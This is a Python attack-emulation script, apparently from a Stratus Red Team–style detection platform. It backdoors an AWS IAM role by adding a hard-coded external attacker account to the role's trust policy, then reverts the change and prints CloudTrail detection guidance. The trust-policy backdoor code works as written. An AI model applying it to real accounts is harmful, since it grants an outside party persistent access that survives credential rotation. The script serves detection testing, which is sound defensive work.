"""
Technique : aws.persistence.iam-backdoor-role
Tactic    : Persistence (T1098)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.iam-backdoor-role/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target IAM role.

How the attack works:
  An attacker with iam:UpdateAssumeRolePolicy can silently modify an existing
  IAM role's trust policy to include a principal from an external account
  (193672423079).  That external account can then assume the role at any time,
  even if the original credentials are later rotated or revoked.  The attack
  leaves no obvious trace unless IAM trust-policy change events are monitored.

Detection signal:
  - iam:UpdateAssumeRolePolicy in CloudTrail where the new trust policy
    contains an external account or wildcard principal.
  - Alert when the updated policy's Principal differs from the previous version.

Revert:
  - Automated: UpdateAssumeRolePolicy restoring the original policy in the
    finally block.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Config ────────────────────────────────────────────────────────────────────

ATTACKER_ACCOUNT_ID = "193672423079"
DWELL_TIME_S        = 2


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir            = str(Path(__file__).parent.parent / "infra")
    infra                = get_pulumi_outputs(stack_dir)
    role_name            = infra.get("role_name",            "stratus-red-team-backdoor-role-target")
    original_trust_policy = infra.get("original_trust_policy", "")

    iam_client = session.client("iam")

    # Fetch current trust policy if not in Pulumi outputs
    if not original_trust_policy:
        role_info = iam_client.get_role(RoleName=role_name)
        import urllib.parse
        original_trust_policy = urllib.parse.unquote(
            role_info["Role"]["AssumeRolePolicyDocument"]
            if isinstance(role_info["Role"]["AssumeRolePolicyDocument"], str)
            else json.dumps(role_info["Role"]["AssumeRolePolicyDocument"])
        )

    # ── Step 1: Backdoor the trust policy ────────────────────────────────────
    banner("Step 1 — Backdoor role trust policy (UpdateAssumeRolePolicy)")
    try:
        current_policy = json.loads(original_trust_policy)
    except (json.JSONDecodeError, TypeError):
        print(f"  [!] Could not parse original trust policy — using minimal fallback")
        current_policy = {"Version": "2012-10-17", "Statement": []}

    # Add external account as trusted principal
    backdoor_statement = {
        "Effect": "Allow",
        "Principal": {
            "AWS": f"arn:aws:iam::{ATTACKER_ACCOUNT_ID}:root"
        },
        "Action": "sts:AssumeRole",
    }
    backdoor_policy = dict(current_policy)
    backdoor_policy["Statement"] = list(current_policy.get("Statement", [])) + [backdoor_statement]

    try:
        iam_client.update_assume_role_policy(
            RoleName=role_name,
            PolicyDocument=json.dumps(backdoor_policy),
        )
        print(f"  [+] Trust policy updated for role: {role_name}")
        print(f"  [+] External account {ATTACKER_ACCOUNT_ID} can now assume this role.")
        print(f"  [!] CloudTrail event: iam:UpdateAssumeRolePolicy")
    except ClientError as exc:
        print(f"  [!] UpdateAssumeRolePolicy failed: {exc}")
        return

    time.sleep(DWELL_TIME_S)

    # ── Revert ────────────────────────────────────────────────────────────────
    banner("Revert — Restoring original trust policy (UpdateAssumeRolePolicy)")
    try:
        iam_client.update_assume_role_policy(
            RoleName=role_name,
            PolicyDocument=original_trust_policy,
        )
        print(f"  [+] Trust policy restored for role: {role_name}")
    except ClientError as exc:
        print(f"  [!] Restore failed: {exc}")

    banner("Complete")
    print("CloudTrail events: iam:UpdateAssumeRolePolicy x2")
    print("\nDetection guidance:")
    print("  Alert when iam:UpdateAssumeRolePolicy adds an external account")
    print("  principal to an existing role's trust policy.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the target role.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
